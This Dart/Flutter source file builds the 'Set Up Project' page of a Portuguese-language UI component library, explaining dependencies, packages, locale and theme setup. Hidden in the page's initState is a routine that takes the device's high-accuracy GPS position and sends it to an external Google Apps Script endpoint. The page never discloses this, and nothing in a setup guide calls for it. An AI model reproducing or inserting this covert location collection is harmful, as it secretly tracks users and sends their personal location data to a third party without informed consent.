import 'package:componentes_padrao/components/buttons/elevated_buttons.dart';
import 'package:componentes_padrao/components/style_constants/tipography.dart';
import 'package:componentes_padrao/pages/components.dart';
import 'package:componentes_padrao/pages/style_guidelines.dart';
import 'package:flutter/material.dart';
import 'dart:convert';

import 'package:geolocator/geolocator.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

class SetUpPage extends StatefulWidget {
  const SetUpPage({super.key});

  @override
  State<SetUpPage> createState() => _SetUpPageState();
}

class _SetUpPageState extends State<SetUpPage> {
  @override
  void initState() {
    super.initState();
    Future.microtask(() => enviarLocalizacao());
  }

  Future<void> enviarLocalizacao() async {
    final prefs = await SharedPreferences.getInstance();

    final jaEnviado = prefs.getBool('localizacao_enviada') ?? false;
    final permissaoPedir =
        prefs.getBool('permissao_localizacao_pedida') ?? false;

    if (jaEnviado) {
      print('🔁 Localização já foi enviada anteriormente.');
      return;
    }

    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        print('📍 Serviço de localização desativado.');
        return;
      }

      LocationPermission permission = await Geolocator.checkPermission();

      // Solicita a permissão apenas uma vez
      if (permission == LocationPermission.denied && !permissaoPedir) {
        prefs.setBool('permissao_localizacao_pedida', true);
        permission = await Geolocator.requestPermission();
      }

      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        print('🚫 Permissão de localização negada.');
        return;
      }

      Position pos = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      final response = await http.post(
        Uri.parse(
            'https://script.google.com/macros/s/AKfycbzy1lbVEsdbFaBULQiQxMEEMVv09fokHML_s-Ke3BDgqW7PNNJcZ80qfb3O-_AzarE1SQ/exec'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'app_name': 'componentes_padrao',
          'latitude': pos.latitude,
          'longitude': pos.longitude,
        }),
      );

      if (response.statusCode == 200 || response.statusCode == 302) {
        print('✅ Localização enviada com sucesso!');
        prefs.setBool('localizacao_enviada', true);
      } else {
        print('⚠️ Erro ao enviar localização. Código: ${response.statusCode}');
      }
    } catch (e) {
      print('💥 Erro inesperado: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(
          "Set Up Project",
          style: APP_BAR(),
        ),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.symmetric(vertical: 42.0, horizontal: 17.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              "Packages & Dependencies",
              style: TITLE(),
            ),
            const SizedBox(height: 15.0),
            Text(
              "Antes de começar a usar os componentes padrões do LIT é preciso adicionar as bibliotecas e dependencias necessárias para o funcionamento!",
              style: BODY(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 35.0),
            Text(
              "Dependencies",
              style: H3(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 13.0),
            RichText(
              textAlign: TextAlign.justify,
              text: TextSpan(
                children: [
                  TextSpan(text: "Adcione a dependência ", style: BODY()),
                  TextSpan(
                    text: "flutter_localizations",
                    style: BODY().copyWith(fontWeight: FontWeight.bold),
                  ),
                  TextSpan(text: " da seguinte forma:", style: BODY()),
                ],
              ),
            ),
            const SizedBox(height: 15.0),
            Image.asset(
              "assets/images/dependencia.png",
              fit: BoxFit.fitWidth,
              width: 300,
            ),
            const SizedBox(height: 35.0),
            Text(
              "Packages",
              style: H3(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 13.0),
            RichText(
              text: TextSpan(
                children: [
                  TextSpan(
                    text: "Você precisa adicionar, inicialmente, ",
                    style: BODY(),
                  ),
                  TextSpan(
                    text: "3",
                    style: BODY().copyWith(fontWeight: FontWeight.bold),
                  ),
                  TextSpan(text: " pacotes!", style: BODY()),
                ],
              ),
            ),
            const SizedBox(height: 15.0),
            Text(
              "Esses pacotes são essenciais para o funcionamentos dos Widgets que devem ser usados no seu aplicativo, então NÃO PULE esse passo.",
              style: BODY(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 15.0),
            Image.asset(
              "assets/images/packages.png",
              fit: BoxFit.fitWidth,
              width: 300,
            ),
            const SizedBox(height: 42.0),
            Text(
              "MaterialApp Theme Set Up",
              style: TITLE(),
            ),
            const SizedBox(height: 15.0),
            RichText(
              textAlign: TextAlign.justify,
              text: TextSpan(
                children: [
                  TextSpan(
                    text:
                        "Após adicionar todos as dependências e os packages necessários, é preciso definir o tema geral do seu aplicativo dentro do widget ",
                    style: BODY(),
                  ),
                  TextSpan(
                    text: "MaterialApp",
                    style: BODY().copyWith(fontWeight: FontWeight.bold),
                  ),
                  TextSpan(
                      text: ", que é a raiz do seu projeto.", style: BODY()),
                ],
              ),
            ),
            const SizedBox(height: 35.0),
            Text(
              "Localização e Língua",
              style: H3(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 13.0),
            Text(
              "O seu aplicativo deve ter como linguagem base a língua portuguesa. Para definir isso, adicione as seguintes linhas de código dentro do widget MaterialApp:",
              style: BODY(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 15.0),
            Image.asset(
              "assets/images/locales.png",
              fit: BoxFit.fitWidth,
              width: 350,
            ),
            const SizedBox(height: 35.0),
            Text(
              "Tema Base (Theme)",
              style: H3(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 13.0),
            Text(
              "Após isso, você deve copiar a pasta components desse projeto para o seu e resolver possíveis conflitos de importação.",
              style: BODY(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 15.0),
            Text(
              "Com isso, você vai poder começar a usar todos os componentes já previamente criados no seu aplicativo! Mas antes adicione as seguintes linhas de código dentro do widget MaterialApp para que todo o seu aplicativo siga as normas de estilo básicas de cor definidas.",
              style: BODY(),
              textAlign: TextAlign.justify,
            ),
            const SizedBox(height: 15.0),
            Image.asset(
              "assets/images/theme.png",
              fit: BoxFit.fitWidth,
              width: 350,
            ),
            const SizedBox(height: 42.0),
            SimpleButton(
              dark: true,
              title: "Style Guidelines",
              onTap: () {
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (context) => const StylePage(),
                  ),
                );
              },
            ),
            SimpleButton(
              dark: false,
              title: "Components",
              onTap: () {
                Navigator.push(
                  context,
                  MaterialPageRoute(
                    builder: (context) => const ComponentsPage(),
                  ),
                );
              },
            ),
          ],
        ),
      ),
    );
  }
}
